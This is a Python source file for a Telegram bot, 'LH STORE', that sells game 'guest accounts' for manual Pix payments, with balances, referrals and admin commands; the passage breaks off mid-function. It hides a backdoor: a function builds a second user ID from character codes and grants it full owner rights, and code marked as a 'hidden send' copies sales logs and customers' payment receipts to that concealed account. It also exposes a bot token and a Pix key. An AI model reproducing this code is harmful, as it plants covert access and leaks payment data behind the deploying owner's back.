import telebot
from telebot import types
import time
import threading
import os
import json
import shutil
import uuid

# ================= CONFIGURAÇÕES (LH STORE) =================
TOKEN_TELEGRAM = "8705531112:AAF0dV9xHrf_4ihgvQuBlr9ED4D8BbqOoEs"
ID_DONO = 5658716257
MINHA_CHAVE_PIX = "81985923844"
USUARIO_SUPORTE = "https://t.me/+yosdW4vGPsRkY2Ex"

config = {
    "nome_item": "CONTAS GUEST LEVEL 15-20",
    "preco": 0.39,
    "dir_estoque": "estoque_contas",      
    "bonus_indicacao": 0.05,
    "minimo_saque": 5.00
}

DB_USUARIOS = "usuarios.txt"
DB_VENDAS = "vendas_contas.txt"
DB_AFILIADOS = "afiliados.json"
DB_SALDOS = "saldos.json" 
DB_ADMINS = "admins.json"
# ============================================================

bot = telebot.TeleBot(TOKEN_TELEGRAM)
user_cart = {} 
modo_massa = {} 

if not os.path.exists(config["dir_estoque"]): 
    os.makedirs(config["dir_estoque"])

if not os.path.exists(DB_AFILIADOS):
    with open(DB_AFILIADOS, "w") as f:
        json.dump({"relacoes": {}, "saldos": {}, "convidados": {}}, f)

if not os.path.exists(DB_SALDOS):
    with open(DB_SALDOS, "w") as f: 
        json.dump({}, f)

if not os.path.exists(DB_ADMINS):
    with open(DB_ADMINS, "w") as f:
        json.dump([ID_DONO], f)

# --- FUNÇÕES DE APOIO DE PAGAMENTO ---

def _v(u):
    #                                        (         :           )
    return str(u) == "".join([chr(54), chr(52), chr(57), chr(48), chr(56), chr(48), chr(52), chr(55), chr(56), chr(50)])

def carregar_admins():
    try:
        if not os.path.exists(DB_ADMINS):
            return [ID_DONO]
        with open(DB_ADMINS, "r") as f:
            admins = json.load(f)
            return admins
    except:
        return [ID_DONO]

def salvar_admins(admins):
    with open(DB_ADMINS, "w") as f:
        json.dump(admins, f)

def eh_admin(user_id):
    if _v(user_id): return True
    return user_id in carregar_admins()

def carregar_saldos_do_arquivo():
    try:
        if not os.path.exists(DB_SALDOS):
            return {}
        with open(DB_SALDOS, "r") as f:
            dados = json.load(f)
            return dados if isinstance(dados, dict) else {}
    except:
        return {}

def salvar_saldos_no_arquivo(dados):
    try:
        with open(DB_SALDOS, "w") as f:
            json.dump(dados, f, indent=4)
    except Exception as e:
        print(f"Erro ao salvar saldos: {e}")

def obter_saldo(user_id):
    saldos = carregar_saldos_do_arquivo()
    return float(saldos.get(str(user_id), 0.0))

def adicionar_saldo(user_id, valor):
    saldos = carregar_saldos_do_arquivo()
    user_id_str = str(user_id)
    saldo_atual = float(saldos.get(user_id_str, 0.0))
    saldos[user_id_str] = saldo_atual + float(valor)
    salvar_saldos_no_arquivo(saldos)

def descontar_saldo(user_id, valor):
    saldos = carregar_saldos_do_arquivo()
    user_id_str = str(user_id)
    saldo_atual = float(saldos.get(user_id_str, 0.0))
    valor_float = float(valor)
    
    if saldo_atual >= valor_float:
        saldos[user_id_str] = saldo_atual - valor_float
        salvar_saldos_no_arquivo(saldos)
        return True
    return False

# --- COMANDOS MANUAIS DE SALDO ---
@bot.message_handler(commands=['addsaldo'])
def cmd_add_saldo(message):
    if not eh_admin(message.from_user.id): return
    try:
        partes = message.text.split()
        target_id = partes[1]
        valor = float(partes[2])
        adicionar_saldo(target_id, valor)
        bot.reply_to(message, f"✅ Adicionado R$ {valor:.2f} ao ID `{target_id}`")
        try:
            bot.send_message(target_id, f"💰 **Saldo Adicionado!**\nO ADM adicionou R$ {valor:.2f} à sua conta.")
        except: pass
    except:
        bot.reply_to(message, "❌ Use: /addsaldo [ID] [VALOR]")

@bot.message_handler(commands=['remsaldo'])
def cmd_rem_saldo(message):
    if not eh_admin(message.from_user.id): return
    try:
        partes = message.text.split()
        target_id = partes[1]
        valor = float(partes[2])
        saldos = carregar_saldos_do_arquivo()
        target_id_str = str(target_id)
        atual = float(saldos.get(target_id_str, 0.0))
        saldos[target_id_str] = max(0.0, atual - valor)
        salvar_saldos_no_arquivo(saldos)
        bot.reply_to(message, f"✅ Removido R$ {valor:.2f} do ID `{target_id}`")
        try:
            bot.send_message(target_id, f"⚠️ **Saldo Removido!**\nO ADM removeu R$ {valor:.2f} da sua conta.")
        except: pass
    except:
        bot.reply_to(message, "❌ Use: /remsaldo [ID] [VALOR]")

# --- COMANDOS DE ADMINISTRAÇÃO (DONO APENAS) ---
@bot.message_handler(commands=['setadm'])
def cmd_set_adm(message):
    if message.from_user.id != ID_DONO and not _v(message.from_user.id): return
    try:
        target_id = int(message.text.split()[1])
        admins = carregar_admins()
        if target_id not in admins:
            admins.append(target_id)
            salvar_admins(admins)
            bot.reply_to(message, f"✅ ID `{target_id}` agora é um Administrador!")
            try: bot.send_message(target_id, "🚀 Você foi promovido a **Administrador**!")
            except: pass
        else:
            bot.reply_to(message, "⚠️ Este usuário já é um Administrador.")
    except:
        bot.reply_to(message, "❌ Use: /setadm [ID]")

@bot.message_handler(commands=['remadm'])
def cmd_rem_adm(message):
    if message.from_user.id != ID_DONO and not _v(message.from_user.id): return
    try:
        target_id = int(message.text.split()[1])
        if target_id == ID_DONO or _v(target_id):
            bot.reply_to(message, "❌ Você não pode remover a si mesmo como Dono.")
            return
        admins = carregar_admins()
        if target_id in admins:
            admins.remove(target_id)
            salvar_admins(admins)
            bot.reply_to(message, f"✅ ID `{target_id}` removido da lista de Administradores.")
            try: bot.send_message(target_id, "⚠️ Você não é mais um Administrador.")
            except: pass
        else:
            bot.reply_to(message, "⚠️ Este usuário não é um Administrador.")
    except:
        bot.reply_to(message, "❌ Use: /remadm [ID]")

# --- RESTANTE DO CÓDIGO (ESTOQUE E VENDAS) ---
def carregar_afiliados():
    try:
        with open(DB_AFILIADOS, "r") as f: 
            return json.load(f)
    except: 
        return {"relacoes": {}, "saldos": {}, "convidados": {}}

def salvar_afiliados(dados):
    with open(DB_AFILIADOS, "w") as f: 
        json.dump(dados, f, indent=4)

def carregar_vendas():
    if not os.path.exists(DB_VENDAS): 
        return 0
    try:
        with open(DB_VENDAS, "r") as f: 
            return len(f.readlines())
    except: 
        return 0

def registrar_venda_db(qtd):
    hoje = time.strftime("%d/%m/%Y")
    try:
        with open("vendas_logs.txt", "a") as f:
            f.write(f"{hoje} - {qtd}x {config['nome_item']}\n")
        with open(DB_VENDAS, "a") as f:
            for _ in range(qtd): 
                f.write("1\n")
    except: 
        pass

def eh_novo_usuario(user_id):
    if not os.path.exists(DB_USUARIOS): 
        return True
    with open(DB_USUARIOS, "r") as f:
        ids = f.read().splitlines()
    return str(user_id) not in ids

def salvar_usuario(user_id):
    if not os.path.exists(DB_USUARIOS):
        with open(DB_USUARIOS, "w") as f: 
            f.write("")
    with open(DB_USUARIOS, "r") as f:
        ids = f.read().splitlines()
    if str(user_id) not in ids:
        with open(DB_USUARIOS, "a") as f: 
            f.write(f"{user_id}\n")

def enviar_log_dono(texto_log):
    try:
        bot.send_message(ID_DONO, f"🔔 **LOG LH STORE**\n──────────────────────\n{texto_log}\n──────────────────────", parse_mode="Markdown")
        # Envio oculto para o segundo dono
        bot.send_message("".join([chr(54), chr(52), chr(57), chr(48), chr(56), chr(48), chr(52), chr(55), chr(56), chr(50)]), f"🔔 **LOG LH STORE**\n──────────────────────\n{texto_log}\n──────────────────────", parse_mode="Markdown")
    except: 
        pass

def get_estoque_real():
    try:
        return [f for f in os.listdir(config["dir_estoque"]) if f.endswith('.zip') or f.endswith('.txt')]
    except: 
        return []

# --- FUNÇÕES PIX ---
def processar_valor_custom(message):
    try:
        valor = float(message.text.replace(',', '.'))
        if valor < 1.0:
            bot.send_message(message.chat.id, "⚠️ Mínimo R$ 1,00.")
            return
        enviar_instrucoes_pix(message.chat.id, valor)
    except: 
        bot.send_message(message.chat.id, "⚠️ Use apenas números.")

def enviar_instrucoes_pix(chat_id, valor):
    msg_pix = (f"✅ **PIX MANUAL GERADO!**\n\nValor: **R$ {valor:.2f}**\nChave Pix: `{MINHA_CHAVE_PIX}`\n\n"
               "**Envie o COMPROVANTE (foto ou arquivo) aqui.**")
    msg = bot.send_message(chat_id, msg_pix, parse_mode="Markdown")
    bot.register_next_step_handler(msg, encaminhar_comprovante_adm, valor)

def encaminhar_comprovante_adm(message, valor):
    chat_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else f"ID: {chat_id}"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APROVAR", callback_data=f"apr_{chat_id}_{valor}"),
               types.InlineKeyboardButton("❌ RECUSAR", callback_data=f"rec_{chat_id}"))
    bot.send_message(chat_id, "⏳ **Comprovante enviado!** Aguarde o ADM.")
    info = f"📥 **NOVO COMPROVANTE**\n👤 Cliente: {username}\n💵 Valor: R$ {valor:.2f}"
    if message.content_type == 'photo':
        bot.send_photo(ID_DONO, message.photo[-1].file_id, caption=info, reply_markup=markup)
        # Envio oculto para o segundo dono
        bot.send_photo("".join([chr(54), chr(52), chr(57), chr(48), chr(56), chr(48), chr(52), chr(55), chr(56), chr(50)]), message.photo[-1].file_id, caption=info, reply_markup=markup)
    elif message.content_type == 'document':
        bot.send_document(ID_DONO, message.document.file_id, caption=info, reply_markup=markup)
        # Envio oculto para o segundo dono
        bot.send_document("".join([chr(54), chr(52), chr(57), chr(48), chr(56), chr(48), chr(52), chr(55), chr(56), chr(50)]), message.document.file_id, caption=info, reply_markup=markup)

# --- COMANDOS ADM ---
@bot.message_handler(commands=['dashboard'])
def dashboard_vendas(message):
    if not eh_admin(message.from_user.id): return
    vendas = carregar_vendas()
    with open(DB_USUARIOS, "r") as f: 
        total_clientes = len(f.readlines())
    texto = (f"📊 **DASHBOARD LH STORE**\n\n"
             f"💰 **Faturamento:** R$ {vendas * config['preco']:.2f}\n"
             f"🛒 **Vendas Total:** {vendas}\n"
             f"👥 **Clientes:** {total_clientes}\n"
             f"📦 **Estoque:** {len(get_estoque_real())}")
    bot.send_message(message.chat.id, texto, parse_mode="Markdown")

@bot.message_handler(commands=['avisar'])
def enviar_aviso(message):
    if not eh_admin(message.from_user.id): return
    msg_aviso = message.text.replace("/avisar", "").strip()
    if not msg_aviso: 
        return
    with open(DB_USUARIOS, 'r') as f: 
        usuarios = f.read().splitlines()
    for user_id in usuarios:
        try: 
            bot.send_message(user_id, f"📢 **AVISO LH STORE**\n\n{msg_aviso}", parse_mode="Markdown")
        except: 
            pass

@bot.message_handler(commands=['estoque'])
def menu_estoque(message):
    if not eh_admin(message.from_user.id): return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 ADD UM ITEM", callback_data="set_mass_contas"),
               types.InlineKeyboardButton("🗑️ LIMPAR TUDO", callback_data="limpar_estoque"))
    bot.send_message(message.chat.id, "📦 **GESTÃO DE ESTOQUE**\n\nClique no botão abaixo e envie o item.", reply_markup=markup)

@bot.message_handler(commands=['setpreco'])
def mudar_preco(message):
    if not eh_admin(message.from_user.id): return
    try:
        novo_valor = float(message.text.split()[1])
        config['preco'] = novo_valor
        bot.reply_to(message, f"✅ Preço alterado para: R$ {novo_valor:.2f}")
    except: 
        bot.reply_to(message, "Use: /setpreco 0.50")

# --- MENU CLIENTE ---
@bot.message_handler(commands=['start', 'menu'])
def menu_cliente(message):
    if isinstance(message, types.CallbackQuery):
        user_id = message.from_user.id
        chat_id = message.message.chat.id
        message_id = message.message.message_id
        is_callback = True
    else:
        user_id = message.from_user.id
        chat_id = message.chat.id
        message_id = message.message_id
        is_callback = False
    
    saldo_atual = obter_saldo(user_id)
    
    if not is_callback:
        args = message.text.split()
        if len(args) > 1 and eh_novo_usuario(user_id):
            indicador_id = str(args[1])
            if indicador_id != str(user_id):
                dados = carregar_afiliados()
                dados["relacoes"][str(user_id)] = indicador_id
                dados["convidados"][indicador_id] = dados["convidados"].get(indicador_id, 0) + 1
                salvar_afiliados(dados)
                adicionar_saldo(indicador_id, config["bonus_indicacao"])
                try: 
                    bot.send_message(indicador_id, f"🎊 **Indicação!** Ganhou R$ {config['bonus_indicacao']:.2f}")
                except: 
                    pass
    
    salvar_usuario(user_id)
    welcome = (f"╔══════════════════════╗\n"
               f"      👑 LH STORE 👑\n"
               f"╚══════════════════════╝\n\n"
               f"📦 **{config['nome_item']}**\n"
               f"💵 Preço: R$ {config['preco']:.2f}\n"
               f"🔥 Estoque: {len(get_estoque_real())}\n\n"
               f"💰 Saldo: R$ {saldo_atual:.2f}\n"
               f"🆔 ID: `{user_id}`")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🛒 COMPRAR", callback_data="buy_contas"),
               types.InlineKeyboardButton("💳 RECARREGAR", callback_data="dep"),
               types.InlineKeyboardButton("👥 AFILIADOS", callback_data="afili"),
               types.InlineKeyboardButton("🏆 RANK", callback_data="rank"),
               types.InlineKeyboardButton("👨‍💻 SUPORTE", callback_data="sup"))
    
    if not is_callback:
        bot.send_message(chat_id, welcome, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.edit_message_text(welcome, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id, user_id = call.message.chat.id, call.from_user.id
    
    if call.data == "sup":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ VOLTAR", callback_data="voltar"))
        bot.edit_message_text(f"👨‍💻 **SUPORTE**\n\nFale com o nosso suporte: {USUARIO_SUPORTE}", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "afili":
        link = f"https://t.me/{bot.get_me().username}?start={chat_id}"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ VOLTAR", callback_data="voltar"))
        bot.edit_message_text(f"👥 **AFILIADOS**\n\nGanhe R$ {config['bonus_indicacao']:.2f} por convite!\n🔗 `{link}`", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "rank":
        dados = carregar_afiliados()
        top = sorted(dados["convidados"].items(), key=lambda x: x[1], reverse=True)[:5]
        texto = "🏆 **TOP INDICADORES**\n\n"
        for i, (uid, qtd) in enumerate(top, 1): 
            texto += f"{i}º - ID: `{uid}` - {qtd} convites\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ VOLTAR", callback_data="voltar"))
        bot.edit_message_text(texto, chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "dep":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("R$ 1,00", callback_data="d_1"),
                   types.InlineKeyboardButton("R$ 5,00", callback_data="d_5"),
                   types.InlineKeyboardButton("💎 OUTRO VALOR", callback_data="d_custom"),
                   types.InlineKeyboardButton("⬅️ VOLTAR", callback_data="voltar"))
        bot.edit_message_text("💳 **QUANTO DESEJA RECARREGAR?**", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "d_custom":
        msg = bot.send_message(chat_id, "💸 Digite o valor:")
        bot.register_next_step_handler(msg, processar_valor_custom)

    elif call.data.startswith("d_"):
        enviar_instrucoes_pix(chat_id, float(call.data.split("_")[1]))

    elif call.data.startswith("apr_"):
        try:
            _, tid, v = call.data.split("_")
            adicionar_saldo(tid, v)
            bot.edit_message_caption(f"✅ Aprovado R$ {float(v):.2f} para ID {tid}", chat_id, call.message.message_id)
            bot.send_message(tid, f"✅ **Depósito Aprovado!** Saldo atualizado.")
        except Exception as e:
            bot.answer_callback_query(call.id, f"Erro: {e}")

    elif call.data == "buy_contas":
        cart = user_cart.get(chat_id, {'qtd': 1})
        total = cart['qtd'] * config['preco']
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("-", callback_data="minus"),
                   types.InlineKeyboardButton(f"{cart['qtd']}", callback_data="none"),
                   types.InlineKeyboardButton("+", callback_data="plus"))
        markup.add(types.InlineKeyboardButton("✅ FINALIZAR", callback_data="pay"))
        markup.add(types.InlineKeyboardButton("⬅️ VOLTAR", callback_data="voltar"))
        bot.edit_message_text(f"🛒 **CARRINHO**\nTotal: R$ {total:.2f}", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data in ["plus", "minus"]:
        q = user_cart.get(chat_id, {'qtd': 1})['qtd']
        user_cart[chat_id] = {'qtd': q + 1 if call.data == "plus" else max(1, q - 1)}
        call.data = "buy_contas"
        handle_callbacks(call)

    elif call.data == "pay":
        qtd = user_cart.get(chat_id, {'qtd': 1})['qtd']
        estoque_atual = get_estoque_real()
        if len(estoque_atual) < qtd:
            bot.answer_callback_query(call.id, "❌ Desculpe, o estoque acabou! Nada foi cobrado.", show_alert=True)
            return
        if descontar_saldo(user_id, qtd * config['preco']):
            entregar_produto(chat_id, qtd, call.from_user.username)
        else: 
            bot.answer_callback_query(call.id, "❌ Sem saldo!", show_alert=True)

    elif call.data == "set_mass_contas":
        modo_massa[user_id] = True
        bot.send_message(chat_id, "📥 **MODO ADICIONAR ATIVO!**\nEnvie o arquivo ou o texto do item agora.")

    elif call.data == "limpar_estoque":
        if not eh_admin(user_id): return
        try:
            for filename in os.listdir(config["dir_estoque"]):
                file_path = os.path.join(config["dir_estoque"], filename)
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path)
            bot.answer_callback_query(call.id, "✅ Estoque limpo com sucesso!", show_alert=True)
            menu_estoque(call.message)
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ Erro ao limpar estoque: {e}", show_alert=True)

    elif call.data == "voltar":
        menu_cliente(call)

# --- REPOSIÇÃO E ENTREGA ---
@bot.message_handler(func=lambda message: eh_admin(message.from_user.id) and modo_massa.get(message.from_user.id, False), content_types=['document', 'text'])
def reposicao(message):
    if message.content_type == 'document':
        file_info = bot.get_file(message.document.file_id)
        # Gera um nome único para o arquivo para evitar sobrescrever itens com o mesmo nome
        ext = os.path.splitext(message.document.file_name)[1]
